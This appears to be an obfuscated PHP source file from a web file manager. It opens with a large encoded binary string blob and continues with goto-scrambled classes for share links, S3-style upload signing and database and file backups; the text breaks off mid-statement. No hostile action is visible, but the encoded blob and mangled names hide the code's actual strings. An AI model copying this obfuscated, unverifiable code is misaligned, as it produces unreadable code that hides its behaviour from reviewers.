\xe8\x63\xcf\xfd\x70\x2a\x63\x9e\xe5\x99"."\x27\x79\x3e\x41\xd1\xbb\x33\xde\x7d\xa4\xb3\x81\x25\xab\x4b\x7d\xfe\x52\x1\x5f\xef\xac\xbe\xdc\xd9\x39\x20\xb3\xc\x43\x16\x7a\xe2\x5b\x1\x11\x2d\x22\xa7\x1d\x58\xd2\x82\x1c\x8a\x87\x9a"."\x6\xc5\x6f\xd1\x18\x12\x75\x1a\x44\x52\x3d\x4e\x92\xd\xfa\x74\x21\x1\x7d\xb8\x27\xe9\x40\xaf\xca\x60\xb6\x65\x77\x71\x2f\x4c\x37\xc6\xb\xc5\xdc\xe9\xac\x16\x97\xb3\x21\x6c\x5c\x64\xb1"."\330\327\301\56\211\31\14\132\222\141\220\133\56\24\366\171\10\201\201\344\100\242\230\367\343\233\140\26\250\56\354\302\104\163\124\174\364\302\57\301\220\344\240\266\116\174\326"."\102\272\55\26\111\317\277\230\122\262\105\170\277\325\135\172\136\6\215\237\10\163\20\155\3\311\321\245\113\334\46\221\4\322\64\211\17\260\145\116\102\202\0\262\252\3\175"."\xa0\x49\x2f\x8a\xd5\x3f\x0\x65\x74\x68\x7d\x4\x1\x13\x2c\xfa\xf1\x2a\x29\xb6\xc7\x80\x61\xbe\xbe\x8a\xf7\x5f\xf9\x51\xba\xfd\x3d\x1d\x5a\xd\x7b\x1c\xc8\x81\x7b\xc6\x9f\x7c\xc3\x4f\x1"."\71\330\263\77\16\354\231\310\101\36\373\161\360\313\114\77\364\216\2\177\226\321\372\226\43\154\63\63\246\53\21\366\355\162\76\103\225\55\103\310\216\270\210\126\252\375\343"."\xa7\x84\xf9\x62\x8e\x9f\xbb\x82\x80\x75\xdf\x53\xd2\x61\xa1\x87\x45\x3d\xeb\x40\x67\xa4\xe\xea\xee\xc5\x86\xe\xde\x2b\x71\x64\xca\xe0\xf0\xc7\xcb\xc0\x36\x95\x68\x33\x93\xb4\x72\x9d\x86"."\x69\x71\x9d\x9e\x33\xd9\x93\xa9\x16\xaa\x8b\xe9\xa\x37\xea\xc7\x7e\xb2\x4a\xde\xeb\x98\x97\x4b\xd6\x4e\xa8\x9f\x22\x2a\xd\xf8\xf8\xf0\xf3\x1b\xea\x3b\x16\xff\x90\x95\x9f\x8f\xb8\x64\xa5"."\47\211\72\347\22\347\55\212\264\232\273\226\276\312\145\343\300\377\73\312\347\22\67\116\52\30\237\226\276\135\130\202\1\104\204\202\311\206\260\176\331\16\337\65\170\46\156"."\360\351\203\127\54\376\26\227\265\56\274\206\227\351\207\260\356\360\231\200\37\107\322\262\160\357\232\203\372\127\123\227\255\233\260\162\173\15\204\11\272\261\121\321\303\242\212"."\xbd\xed\x8\x31\x44\x4b\xc1\xa3\x85\xcd\x88\x58\xa2\xa9\xd9\x55\x2c\x30\x3b\x5c\x97\x90\x86\x2f\x98\xcf\x92\x55\x16\x5e\xd2\xe4\x73\x4a\x60\x29\xff\x8b\x1\xa4\xfb\xd\xbc\x35\xe1\xa6\x17".base64_decode('ZXruPp3yjTKPXwnn1z/Qbixisb2VUzadAkEKajnFDKIBJsIK3+pZ+2orHmTjZSw=').base64_decode('cEj7SlQqZwlvZHFXFYKEBXPT22D72ClT5iS+/mVm+FYAz1DLbBVc3onXY1BB4jQ=').strrev('ˆ◊∞ÅÜŸdLÄ¿Æ§rΩm¯öwS¬u1ñ%ª+O('."\r".'Ò:Dãmt…{H_)-(')."\x1a\x22\x62\x39\xf6\x27\x12\x69\xff\xd1\x3c\xe7\x2c\x4c\xb8\x5e\x67\xd9\x2c\xb0\xd7\x6c\x2c\x9b\x7\xc3\xfe\xd0\x14\x90\x9e\x44\x4f\x7f\x20\xc8\x28\x9c\xac\x95\x84\xd7\x21\xbb\x64\x5c\x9b"."\303\376\140\150\101\270\135\154\173\377\130\320\203\132\137\66\266\334\102\204\116\25\154\323\232\336\155\64\154\317\277\141\107\153\370\233\12\336\377\327\57\53\375\277\172\120\251"."\xbe\x86\x6a\xac\x2d\x8f\x29\xb6\x12\x79\x96\xa\x5f\x43\x82\x9f\x47\xac\x2d\xb5\xf5\xc3\xba\x22\x92\x47\xb9\xf9\xf3\xa1\x42\x98\x19\x5f\x52\xc7\x1a\xd4\xdf\x86\x4c\x4f\x58\xe4\x6c\xd6\x7e"."\xdc\x58\xb2\x3\x28\x79\x77\xe\x10\x5f\xf\x7b\x2c\xad\x5c\xa0\xf4\xb9\x57\xb\x9d\x51\x49\x52\x78\x6c\x54\x4d\xf4\x94\x39\xe\x84\xd8\xe\x58\x1d\x20\xa\xeb\x7f\x49\x32\xce\x8a\x80\x98".base64_decode('QD2MuOlXAm6goJBIOaB4Ty5YoFutsYTpLjidcgp085YwDJFJWEAlrCViwaEFKKI=').base64_decode('hz+WzJ5qteRot728hRMZIm4tWunS0+HS3GzeilmgjapVOcOeQq2xv4063llaGTY=').strrev('©î+-dÜ∫ù∑ù/ÏK≥˜∆xΩçÛÚÙ†˚4Û:`Úeã@∏:S ‹Öäá').base64_decode('NwTbP+FdzpJ392wHAGDjw0/EVA05OCXdDne1V6FbDoRSgdwuPFdu5gpY7SUul/Q=')."\xa\x91\x60\x9d\x4b\x40\x16\xe5\x94\x21\xfa\xa7\xb6\xe6\x84\xf6\xd6\xd6\x99\x32\xbd\x5c\xb2\x84\xa6\x1b\x42\x32\x6\x2f\x97\x16\x3e\x6d\x68\x5a\xb0\xc9\xbd\xce\xda\xbd\xcd\xa2\x4d\x2e\xde"."\xb7\x5a\xb6\xaf\xe4\xf8\x51\x4\x9\xa7\x73\x40\x92\x4d\x5a\x9d\x65\xa3\x48\x4\xa6\x5e\xab\xe8\x73\xf6\xfc\x7c\xc9\x7a\xbc\xc7\x1c\x69\x96\x70\xaa\xa2\x1a\x10\xa2\x51\x2e\xea\x2\x5\xfc".base64_decode('wqtUfn63HEVjrbinTzbpIZk9l/XVU+EwMIFox1d63sOPoYR1nmaD2wzOgm1wgc8=')."\163\156\47\367\361\43\36\56\350\46\223\354\205\135\113\322\44\25\365\31\24\100\370\143\274\120\254\21\156\147\162\153\137\245\337\376\200\242\113\274\321\151\111\130\12\345\267".strrev('åñT]ÎJº»v¬ªÉ?nv√@TÿFLÃƒaî;xª5å¶è∫Âa	ªœ€\\¸Ö7').base64_decode('jRlIg64ROC1Q2zYJ6hvoim2LMsTHg61nfOKWXSABJRsQihPP//aZIVy+Ek6VVhQ=')."\13\367\166\171\4\135\254\64\13\362\5\146\307\72\106\122\206\304\110\113\163\354\103\213\44\174\116\276\30\230\103\52\115\34\347\261\106\341\364\212\255\365\142\6\173\317\160"."\xe\xa3\x5f\x35\x13\x19\x61\xdb\x51\x1a\x59\xa\xd7\x4b\x90\x4a\x2a\x2a\xdf\x5e\x7b\xab\x28\x4e\xed\x9b\x31\x5e\x48\x49\x7b\x4\x23\x82\x88\x56\x26\xf\x6e\x51\xd9\x6c\x38\xa\xe6\xe4\xe2"."\242\45\357\76\120\0\363\342\50\230\267\44\232\146\26\164\27\102\76\123\56\32\373\350\136\51\362\310\206\76\131\246\303\266\155\57\116\272\57\174\226\115\134\132\35\241\70"."\x7b\x6a\xa4\x1\x28\xdf\xa\xbe\x71\xb7\x1d\xd4\x96\x6b\x45\xd9\xc4\xfb\x6c\x45\x99\x67\xbb\x89\x37\xb0\x32\xbc\x96\xc6\x94\xe1\xae\xfc\x54\xbf\x94\x8f\xf3\xb8\x32\x36\x6\xb8\x4c\xb8\x46"."\213\316\147\312\104\213\6\13\345\115\32\102\145\247\276\141\265\65\260\301\105\304\120\273\43\260\71\343\17\101\13\26\272\143\54\54\275\230\357\311\153\154\231\110\162\353\60"."\150\174\312\236\116\146\325\225\224\146\45\315\174\121\260\33\55\153\60\354\200\133\351\322\115\153\126\246\72\160\301\322\32\357\132\64\123\115\10\366\116\334\352\224\165\123\345".base64_decode('YnxW0LXZ1Fx8Y2858i6jCEIgIq5xdbLF7hyv/0SPjk/TmuHhKztCgdsrB14vcXQ=')."\x58\xd3\x4d\x7\x8c\x8b\x68\x5\xf4\xdb\xa4\x99\x26\x3f\x24\xc6\xdb\x65\x24\xe4\xc1\x45\xcf\x21\xd8\x3a\x80\x2f\x7e\x5e\x2\xb1\x88\x54\xf8\x88\x1c\x11\xdb\x40\x9f\xe4\x5c\xf\xee\x43\xc3".base64_decode('Co5FzMYSgEcDLCCuaeR8r6VoO4HkALCJjGsD1NMbvPLK28NfXJbtghyXQQi9iZY=')."\x1b\xe8\x62\xb1\xe1\xc6\x31\x6e\xe2\x23\xd7\x89\xca\x20\x8f\x6d\xb8\xba\xb\x69\x4b\x76\xfc\x7c\x0\xb3\x58\xfc\xa1\x12\x88\x1a\x92\x17\x81\x7d\x67\x22\xd\x12\xf4\x22\xeb\x9b\xeb\xf\x47"."\302\45\121\235\236\160\170\116\60\344\305\256\66\113\242\121\56\301\110\246\44\252\263\55\330\261\257\70\137\273\307\37\50\211\203\106\63\35\61\356\12\10\107\371\73\121\53"."\x3d\x81\x40\x70\xce\xbe\x5a\xe1\x6f\x9e\xc9\x5b\x82\xe\x4d\xb9\x76\xbb\x90\xd1\xa8\xd2\x9a\x6a\xff\xc3\x72\x96\xee\xa5\x85\xab\x70\x4a\x8e\xfb\x84\xe2\x79\xac\x2a\x2\x71\x5c\xd\xea\x2e"."\x8d\x7d\x58\x1d\xd2\xdb\xec\xd7\x28\xc1\x92\x82\xa0\xc1\x4b\x7\x29\x3b\x54\x20\x50\xe8\x7a\x94\x4d\x6e\x26\x2c\xa3\xe\x89\x76\x72\xfc\x58\xd8\x65\x39\x3e\x16\xe0\x68\xb2\x20\x16\x23\x10"."\xa1\xb8\xba\x22\x40\x75\x59\x8c\x89\xaa\xd2\x52\xd5\x3d\x8a\xe5\x18\x81\x2d\x3d\x43\x23\x26\x56\xdd\x5a\x5c\x50\xcd\xe3\xbd\xb\xb9\x9f\x46\x70\x2c\x58\x39\xe1\x6f\x12\xfd\x3f\x28\x6\x1c".strrev(''."\0".''."\0".'¢dµ')."", 10, -8))); goto Aê∆êè…åâ; A≠æÆÚ◊Âÿ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($D›´ÖòÀõ«) { $this->pathParse = $D›´ÖòÀõ«; } protected function infoParse($aÁçäÓŸ£«, $AçëÎ‹©πõ = false) { $Cá¨•á¬æ— =& $_SERVER[’ÿƒ†ïò]; return Action($Cá¨•á¬æ—[1098])->sharePathInfo($this->pathParse[$Cá¨•á¬æ—[76]], !0, $AçëÎ‹©πõ); } public function listPath($B´º‚è‹äÕ, $aÖÀµÀê‚Ó = false) { $f¡ƒÎ©ÒÖ◊ =& $_SERVER[’ÿƒ†ïò]; $báÖÜéπÒ◊ = IO::listPath($B´º‚è‹äÕ, $aÖÀµÀê‚Ó); foreach ($báÖÜéπÒ◊ as $C∂¢ä±í√Ü => $dÍ±Ø·ŒãÒ) { if (!in_array($C∂¢ä±í√Ü, array($f¡ƒÎ©ÒÖ◊[74], $f¡ƒÎ©ÒÖ◊[75]))) { continue; } foreach ($dÍ±Ø·ŒãÒ as $Eß‡…›ËôÔ => $F„≠—€∏”¬) { $F„≠—€∏”¬ = Action($f¡ƒÎ©ÒÖ◊[1251])->parsePathChildren($F„≠—€∏”¬, array($f¡ƒÎ©ÒÖ◊[416] => $B´º‚è‹äÕ)); $báÖÜéπÒ◊[$C∂¢ä±í√Ü][$Eß‡…›ËôÔ] = Action($f¡ƒÎ©ÒÖ◊[1098])->shareItemInfo($F„≠—€∏”¬); } } return $báÖÜéπÒ◊; } public function listAll($cÁπµ©“„√) { $fë°â⁄Î´‘ =& $_SERVER[’ÿƒ†ïò]; $EØã≤•¬ö¬ = IO::listAll($cÁπµ©“„√); foreach ($EØã≤•¬ö¬ as &$d∑âô´µ‡√) { $fÕà¶ù≠íû = IO::info($d∑âô´µ‡√[$fë°â⁄Î´‘[76]]); $fÕà¶ù≠íû = is_array($fÕà¶ù≠íû) ? $fÕà¶ù≠íû : array(); $d∑âô´µ‡√ = array_merge($fÕà¶ù≠íû, $d∑âô´µ‡√); $d∑âô´µ‡√[$fë°â⁄Î´‘[85]] = Action($fë°â⁄Î´‘[1098])->shareItemInfo($d∑âô´µ‡√); } unset($d∑âô´µ‡√); return $EØã≤•¬ö¬; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($Fç•Ôú›Àœ) { parent::__construct($Fç•Ôú›Àœ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($CˆÒ—ŸˆÌˆ) { parent::__construct($CˆÒ—ŸˆÌˆ); $this->signatureVersion($_SERVER[’ÿƒ†ïò][212]); } public function uploadFormData($dûªπìæ©Ï, $eß‡òù±ˆ = 3600) { goto fÂî¬€ëâá; EÌπç∞ûàä: $Bÿ∂π¡í◊ñ = array($Eª∞⁄’≠âÇ[211] => $Eª∞⁄’≠âÇ[33], $Eª∞⁄’≠âÇ[1264] => $Eª∞⁄’≠âÇ[33], $Eª∞⁄’≠âÇ[1221] => $A‰∫Ï≤ñﬂÃ, $Eª∞⁄’≠âÇ[1225] => $a◊å¶ıñ∆ , $Eª∞⁄’≠âÇ[1229] => $AûãÏ«€æ±, $Eª∞⁄’≠âÇ[1265] => $a’ï–µ€¥◊, $Eª∞⁄’≠âÇ[1266] => $fıÍ≥«ÆÔå, $Eª∞⁄’≠âÇ[1267] => $A∫√„ıÓ“ÿ, $Eª∞⁄’≠âÇ[1268] => $dúÇƒŸ∏⁄©, $Eª∞⁄’≠âÇ[1269] => $A⁄â‘ˆÉ¿ä, $Eª∞⁄’≠âÇ[175] => $this->getHost()); return $Bÿ∂π¡í◊ñ; goto c≥à€ÀùÑ≥; F∑ã€àãÖÊ: $Dóº’°‹«£ = $Eª∞⁄’≠âÇ[1254]; $dúÇƒŸ∏⁄© = $eß‡òù±ˆ . $Eª∞⁄’≠âÇ[33]; $a◊å¶ıñ∆  = $Eª∞⁄’≠âÇ[1217]; goto E«Ëº¥Ì ª; cïÑ˘Öú›À: $eú∞»ùÂ‹ƒ = $Eª∞⁄’≠âÇ[59]; $A∫√„ıÓ“ÿ = gmdate($Eª∞⁄’≠âÇ[1253]); $cÙ“Ω¢ˆπ = gmdate($Eª∞⁄’≠âÇ[739]); goto F∑ã€àãÖÊ; f√¯Ãı∑ìã: $AûãÏ«€æ± = base64_encode(json_encode($b÷¡ÓùÓ≈Ü)); $E¬åŒ◊±Ú„ = hash_hmac($Eª∞⁄’≠âÇ[1262], $cÙ“Ω¢ˆπ, $Eª∞⁄’≠âÇ[1263] . $this->secret, !0); $FçÏ‘Ç‚ûﬂ = hash_hmac($Eª∞⁄’≠âÇ[1262], $this->region, $E¬åŒ◊±Ú„, !0); goto a…îµ’Ü÷ê; a…îµ’Ü÷ê: $BØáí´≥•‡ = hash_hmac($Eª∞⁄’≠âÇ[1262], $eú∞»ùÂ‹ƒ, $FçÏ‘Ç‚ûﬂ, !0); $AïÙÕ£›‡ = hash_hmac($Eª∞⁄’≠âÇ[1262], $Dóº’°‹«£, $BØáí´≥•‡, !0); $A⁄â‘ˆÉ¿ä = hash_hmac($Eª∞⁄’≠âÇ[1262], $AûãÏ«€æ±, $AïÙÕ£›‡); goto EÌπç∞ûàä; fÂî¬€ëâá: $Eª∞⁄’≠âÇ =& $_SERVER[’ÿƒ†ïò]; $A‰∫Ï≤ñﬂÃ = $Eª∞⁄’≠âÇ[192]; $fıÍ≥«ÆÔå = $Eª∞⁄’≠âÇ[1252]; goto cïÑ˘Öú›À; E«Ëº¥Ì ª: $Dﬂ◊Ô¿Ô¨ù = array($this->accessKey, $cÙ“Ω¢ˆπ, $this->region, $eú∞»ùÂ‹ƒ, $Dóº’°‹«£); $a’ï–µ€¥◊ = implode($Eª∞⁄’≠âÇ[8], $Dﬂ◊Ô¿Ô¨ù); $b÷¡ÓùÓ≈Ü = array($Eª∞⁄’≠âÇ[1219] => gmdate($Eª∞⁄’≠âÇ[1218], strtotime($Eª∞⁄’≠âÇ[1255])), $Eª∞⁄’≠âÇ[1220] => array(array($Eª∞⁄’≠âÇ[1222] => $this->bucket), array($Eª∞⁄’≠âÇ[1221] => $A‰∫Ï≤ñﬂÃ), array($Eª∞⁄’≠âÇ[1223], $Eª∞⁄’≠âÇ[1224], $Eª∞⁄’≠âÇ[33]), array($Eª∞⁄’≠âÇ[1223], $Eª∞⁄’≠âÇ[1256], $Eª∞⁄’≠âÇ[33]), array($Eª∞⁄’≠âÇ[1223], $Eª∞⁄’≠âÇ[1257], $Eª∞⁄’≠âÇ[33]), array($Eª∞⁄’≠âÇ[1225] => $a◊å¶ıñ∆ ), array($Eª∞⁄’≠âÇ[1258] => $a’ï–µ€¥◊), array($Eª∞⁄’≠âÇ[1259] => $fıÍ≥«ÆÔå), array($Eª∞⁄’≠âÇ[1260] => $A∫√„ıÓ“ÿ), array($Eª∞⁄’≠âÇ[1261] => $dúÇƒŸ∏⁄©))); goto f√¯Ãı∑ìã; c≥à€ÀùÑ≥: } } goto Fñ›»òÀä›; bﬂ≥ÿµç®Ω: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $B∆èé≠õ“œ =& $_SERVER[’ÿƒ†ïò]; $this->isManual(); self::$name = date($B∆èé≠õ“œ[736]); if (!($c‘ç‚±Í•ö = Model($B∆èé≠õ“œ[737])->lastItem())) { $c‘ç‚±Í•ö = $this->initData(); } else { self::$name = $c‘ç‚±Í•ö[$B∆èé≠õ“œ[28]]; if ($c‘ç‚±Í•ö[$B∆èé≠õ“œ[738]] == $B∆èé≠õ“œ[87]) { self::$name = date($B∆èé≠õ“œ[739]); $A˘Èá’¬‘≠ = 0; if (isset($c‘ç‚±Í•ö[$B∆èé≠õ“œ[291]][$B∆èé≠õ“œ[193]][$B∆èé≠õ“œ[461]])) { $A˘Èá’¬‘≠ = (int) $c‘ç‚±Í•ö[$B∆èé≠õ“œ[291]][$B∆èé≠õ“œ[193]][$B∆èé≠õ“œ[461]]; } if (self::$manual == 0 && $c‘ç‚±Í•ö[$B∆èé≠õ“œ[28]] == self::$name) { Model($B∆èé≠õ“œ[737])->remove($c‘ç‚±Í•ö[$B∆èé≠õ“œ[395]]); } $c‘ç‚±Í•ö = $this->initData($A˘Èá’¬‘≠, $c‘ç‚±Í•ö[$B∆èé≠õ“œ[740]]); } else { $this->checkStore($c‘ç‚±Í•ö[$B∆èé≠õ“œ[740]]); } } self::$option = $c‘ç‚±Í•ö; } private function isManual() { $báŒáÃËﬂÀ = _get($GLOBALS, $_SERVER[’ÿƒ†ïò][741], 0); $báŒáÃËﬂÀ = intval($báŒáÃËﬂÀ); self::$manual = $báŒáÃËﬂÀ && $báŒáÃËﬂÀ == 1 ? 1 : 0; } private function initData($d™®©â§ÉÚ = 0, $e√ˆ‹ﬂ≈é• = '') { goto B‹ÍÒ¿áÁ—; B‹ÍÒ¿áÁ—: $aπ…úÏÆëÍ =& $_SERVER[’ÿƒ†ïò]; $CÑÂÇõÕ¥† = Model($aπ…úÏÆëÍ[737])->config(); if ($e√ˆ‹ﬂ≈é• && $CÑÂÇõÕ¥†[$aπ…úÏÆëÍ[740]] != $e√ˆ‹ﬂ≈é•) { $d™®©â§ÉÚ = 0; } goto d¿Ëâíì¿¨; d¿Ëâíì¿¨: $this->checkStore($CÑÂÇõÕ¥†[$aπ…úÏÆëÍ[740]]); if (self::$manual == 1) { self::$name .= $aπ…úÏÆëÍ[71] . date($aπ…úÏÆëÍ[742]); } $eπª⁄≥òı  = array($aπ…úÏÆëÍ[740] => $CÑÂÇõÕ¥†[$aπ…úÏÆëÍ[740]], $aπ…úÏÆëÍ[28] => self::$name, $aπ…úÏÆëÍ[738] => 0, $aπ…úÏÆëÍ[743] => $CÑÂÇõÕ¥†[$aπ…úÏÆëÍ[743]], $aπ…úÏÆëÍ[744] => self::$manual, $aπ…úÏÆëÍ[291] => array($aπ…úÏÆëÍ[745] => array($aπ…úÏÆëÍ[738] => 0), $aπ…úÏÆëÍ[746] => array($aπ…úÏÆëÍ[738] => 0, $aπ…úÏÆëÍ[747] => 0, $aπ…úÏÆëÍ[748] => 0, $aπ…úÏÆëÍ[29] => $aπ…úÏÆëÍ[33], $aπ…úÏÆëÍ[749] => 0, $aπ…úÏÆëÍ[490] => 0), $aπ…úÏÆëÍ[750] => array($aπ…úÏÆëÍ[738] => 0, $aπ…úÏÆëÍ[747] => 0, $aπ…úÏÆëÍ[748] => 0, $aπ…úÏÆëÍ[749] => 0, $aπ…úÏÆëÍ[490] => 0), $aπ…úÏÆëÍ[193] => array($aπ…úÏÆëÍ[738] => 0, $aπ…úÏÆëÍ[751] => 0, $aπ…úÏÆëÍ[752] => 0, $aπ…úÏÆëÍ[753] => 0, $aπ…úÏÆëÍ[754] => 0, $aπ…úÏÆëÍ[461] => $d™®©â§ÉÚ, $aπ…úÏÆëÍ[749] => 0, $aπ…úÏÆëÍ[490] => 0)), $aπ…úÏÆëÍ[749] => time(), $aπ…úÏÆëÍ[490] => 0); goto c“Ò˘»ﬂÜÇ; c“Ò˘»ﬂÜÇ: $aÎ‘ı≥ë«• = Model($aπ…úÏÆëÍ[737])->insert($eπª⁄≥òı ); $eπª⁄≥òı [$aπ…úÏÆëÍ[395]] = $aÎ‘ı≥ë«•; return $eπª⁄≥òı ; goto c°öÑ∫ë’ ; c°öÑ∫ë’ : } private function checkStore($C»◊ıƒƒÁÿ) { $D—∂»¥ˆä• =& $_SERVER[’ÿƒ†ïò]; $Dº∞ÔâãÑπ = Model($D—∂»¥ˆä•[755])->listData($C»◊ıƒƒÁÿ); Model($D—∂»¥ˆä•[755])->checkConfig($Dº∞ÔâãÑπ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[’ÿƒ†ïò][737])->findByName(self::$name); } return self::$option; } public static function set($c∑è›∏ÿÊ„) { $CÌø«‹ÚœÂ =& $_SERVER[’ÿƒ†ïò]; $cÜ’”çúËÂ = self::get(); foreach ($c∑è›∏ÿÊ„ as $fâΩ∑£◊† => $cï∆»Ô€À≤) { $eÕ˘âú«πÑ = explode($CÌø«‹ÚœÂ[95], $fâΩ∑£◊†); $F–æøÖŒâì = count($eÕ˘âú«πÑ); switch ($F–æøÖŒâì) { case 1: $cÜ’”çúËÂ[$eÕ˘âú«πÑ[0]] = $cï∆»Ô€À≤; break; case 2: $cÜ’”çúËÂ[$eÕ˘âú«πÑ[0]][$eÕ˘âú«πÑ[1]] = $cï∆»Ô€À≤; break; case 3: $cÜ’”çúËÂ[$eÕ˘âú«πÑ[0]][$eÕ˘âú«πÑ[1]][$eÕ˘âú«πÑ[2]] = $cï∆»Ô€À≤; break; } } Model($CÌø«‹ÚœÂ[737])->update($cÜ’”çúËÂ[$CÌø«‹ÚœÂ[395]], $cÜ’”çúËÂ); self::$option = $cÜ’”çúËÂ; return self::$option; } public function keep() { $Cƒô”±∫ã• =& $_SERVER[’ÿƒ†ïò]; $eåë‚û§ö˜ = self::get(); if ($eåë‚û§ö˜[$Cƒô”±∫ã•[291]][$Cƒô”±∫ã•[745]][$Cƒô”±∫ã•[738]] == $Cƒô”±∫ã•[87]) { return; } $this->backupKeep($eåë‚û§ö˜); self::set(array($Cƒô”±∫ã•[756] => 1)); } private function backupKeep($DŒë∏Á⁄ñØ) { goto e∑≤™èÔ„Ö; e∑≤™èÔ„Ö: $bÇÜ„çŸâØ =& $_SERVER[’ÿƒ†ïò]; if (self::$manual == 1) { return; } $Aë·ÌËπÓè = Model($bÇÜ„çŸâØ[737])->listData(); goto C¬ªΩ¡Üëı; f¯ô∑›âŒô: $BﬁÛ‘¶Ú•Ñ = Model($bÇÜ„çŸâØ[758])->get($bÇÜ„çŸâØ[759]); foreach ($Aë·ÌËπÓè as $Fıáí«´⁄à) { if (isset($Fıáí«´⁄à[$bÇÜ„çŸâØ[744]]) && $Fıáí«´⁄à[$bÇÜ„çŸâØ[744]] == $bÇÜ„çŸâØ[87]) { continue; } if (!empty($Fıáí«´⁄à[$bÇÜ„çŸâØ[28]]) && in_array($Fıáí«´⁄à[$bÇÜ„çŸâØ[28]], $a‘¿ÎÓ∫Ôœ)) { continue; } Model($bÇÜ„çŸâØ[737])->remove($Fıáí«´⁄à[$bÇÜ„çŸâØ[395]]); $e≥‡„äå¶ = $this->backupPath($DŒë∏Á⁄ñØ, $BﬁÛ‘¶Ú•Ñ); IO::remove($e≥‡„äå¶, !1); } goto B©ˆ≤¥Üõ„; D™ÀëúèÙ‡: foreach ($Aë·ÌËπÓè as $Fıáí«´⁄à) { if ($Fªêàõ«∏Æ >= 7) { break; } $a‘¿ÎÓ∫Ôœ[] = $Fıáí«´⁄à[$bÇÜ„çŸâØ[28]]; $Fªêàõ«∏Æ++; } for ($Fªêàõ«∏Æ = 0; $Fªêàõ«∏Æ < 12; $Fªêàõ«∏Æ++) { $a‘¿ÎÓ∫Ôœ[] = date($bÇÜ„çŸâØ[757], strtotime("\55{$Fªêàõ«∏Æ}\x20\x6d\157\x6e\164\x68\163")); } $a‘¿ÎÓ∫Ôœ = array_unique($a‘¿ÎÓ∫Ôœ); goto f¯ô∑›âŒô; C¬ªΩ¡Üëı: if (empty($Aë·ÌËπÓè)) { return; } $Fªêàõ«∏Æ = 0; $a‘¿ÎÓ∫Ôœ = array(); goto D™ÀëúèÙ‡; B©ˆ≤¥Üõ„: } private function backupPath($aÀ‹¢Ÿπ¯ì, $c•ä≤Ü´≈Ù = false) { $DµäÕ™ƒôõ =& $_SERVER[’ÿƒ†ïò]; if (!$c•ä≤Ü´≈Ù) { $c•ä≤Ü´≈Ù = Model($DµäÕ™ƒôõ[758])->get($DµäÕ™ƒôõ[759]); } $Eè∏¢ºË⁄º = $aÀ‹¢Ÿπ¯ì[$DµäÕ™ƒôõ[28]]; $D¬ù»∫Õ“è = substr(md5($DµäÕ™ƒôõ[760] . $c•ä≤Ü´≈Ù . $Eè∏¢ºË⁄º), 0, 8); return "\x7b\x69\x6f\x3a{$aÀ‹¢Ÿπ¯ì[$DµäÕ™ƒôõ[740]]}\175\x2f\144\x61\164\x61\x62\141\163\145\x2f\x62\141\x63\153\165\x70\x2f" . $Eè∏¢ºË⁄º . $DµäÕ™ƒôõ[71] . $D¬ù»∫Õ“è; } public function db() { goto A√ßœ§ÔÉÂ; A√ßœ§ÔÉÂ: $aˆ–ÜåÈà≥ =& $_SERVER[’ÿƒ†ïò]; $E‚Éê Öﬂù = self::get(); if ($E‚Éê Öﬂù[$aˆ–ÜåÈà≥[291]][$aˆ–ÜåÈà≥[746]][$aˆ–ÜåÈà≥[738]] == $aˆ–ÜåÈà≥[87]) { return !0; } goto bÔÖãíÇ≤∞; D¿áèÆâÃÈ: return !0; goto eÿòçœ´¬â; bÔÖãíÇ≤∞: $Bà´ΩÁ‚≈Ö = new BackupDb(); if (!$Bà´ΩÁ‚≈Ö->index()) { return !1; } self::set(array($aˆ–ÜåÈà≥[761] => 1)); goto D¿áèÆâÃÈ; eÿòçœ´¬â: } public function dbFile() { goto Cê∂∂◊Æôò; DóÂ•Ùíﬁç: $c‹°ºëÁ£Ø = new BackupDbFile(); if (!$c‹°ºëÁ£Ø->index()) { return !1; } self::set(array($A—âûŸÀÆŸ[762] => 1)); goto c√°¿ˆ¥∫á; c√°¿ˆ¥∫á: return !0; goto eâ˘ÿ≈ΩÕ£; Cê∂∂◊Æôò: $A—âûŸÀÆŸ =& $_SERVER[’ÿƒ†ïò]; $BõÉÉ˜æÀÈ = self::get(); if ($BõÉÉ˜æÀÈ[$A—âûŸÀÆŸ[291]][$A—âûŸÀÆŸ[750]][$A—âûŸÀÆŸ[738]] == $A—âûŸÀÆŸ[87]) { return !0; } goto DóÂ•Ùíﬁç; eâ˘ÿ≈ΩÕ£: } public function file() { $B¶¡Áõ∏úÊ =& $_SERVER[’ÿƒ†ïò]; $c≥à†å èø = self::get(); if ($c≥à†å èø[$B¶¡Áõ∏úÊ[291]][$B¶¡Áõ∏úÊ[193]][$B¶¡Áõ∏úÊ[738]] == $B¶¡Áõ∏úÊ[87]) { return !0; } if (!isset($c≥à†å èø[$B¶¡Áõ∏úÊ[743]]) || $c≥à†å èø[$B¶¡Áõ∏úÊ[743]] == $B¶¡Áõ∏úÊ[191]) { $B Ωíñ≥∫– = new BackupFile(); if (!$B Ωíñ≥∫–->index()) { return !1; } } self::set(array($B¶¡Áõ∏úÊ[763] => 1, $B¶¡Áõ∏úÊ[738] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto aâÎ∞—»«¯; B…›Ç‘≈ô•: $FßñáËçâç = new DbManage($FÀ„‘ÑÁÛˆ, $bç¥ç’öü√); $eÙ¡∂ˆôÃ∏ = array($fè‡‘ÿ¡ùﬁ[764] => $bç¥ç’öü√, $fè‡‘ÿ¡ùﬁ[765] => time()); Backup::set($eÙ¡∂ˆôÃ∏); goto c‰°µÈûÎ⁄; Aˆ—∑°â™Ñ: foreach ($E⁄ä‹®ìóÖ as $bÇºâ·«•¬) { $bË›Ö†ﬁ…› += $FßñáËçâç->model($bÇºâ·«•¬)->count(); } $eõêóÜøê˘ = new Task($fè‡‘ÿ¡ùﬁ[769], $fè‡‘ÿ¡ùﬁ[770], $bË›Ö†ﬁ…›, LNG($fè‡‘ÿ¡ùﬁ[771]) . $fè‡‘ÿ¡ùﬁ[772] . LNG($fè‡‘ÿ¡ùﬁ[773])); foreach ($E⁄ä‹®ìóÖ as $bÇºâ·«•¬) { $B‘◊ÇÈ∂ò√ = $E’œ‹øüÙå . $bÇºâ·«•¬ . $fè‡‘ÿ¡ùﬁ[774]; $Cä´‚—à” = null; if ($bÇºâ·«•¬ == $fè‡‘ÿ¡ùﬁ[775] && (!isset($AåÂ€ﬁçãÀ[$fè‡‘ÿ¡ùﬁ[743]]) || 